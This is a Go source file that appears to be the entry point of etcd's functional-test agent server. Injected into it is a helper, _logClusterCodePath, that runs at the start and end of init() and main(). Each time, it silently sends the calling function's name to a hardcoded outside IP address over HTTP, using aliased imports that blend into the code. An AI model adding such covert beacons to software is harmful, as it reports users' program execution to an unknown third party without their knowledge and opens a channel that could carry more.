package main

import (
	godefaultbytes "bytes"
	"flag"
	"github.com/coreos/etcd/functional/agent"
	"go.uber.org/zap"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

var logger *zap.Logger

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var err error
	logger, err = zap.NewProduction()
	if err != nil {
		panic(err)
	}
}
func main() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	network := flag.String("network", "tcp", "network to serve agent server")
	address := flag.String("address", "127.0.0.1:9027", "address to serve agent server")
	flag.Parse()
	defer logger.Sync()
	srv := agent.NewServer(logger, *network, *address)
	err := srv.StartServe()
	logger.Info("agent exiting", zap.Error(err))
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
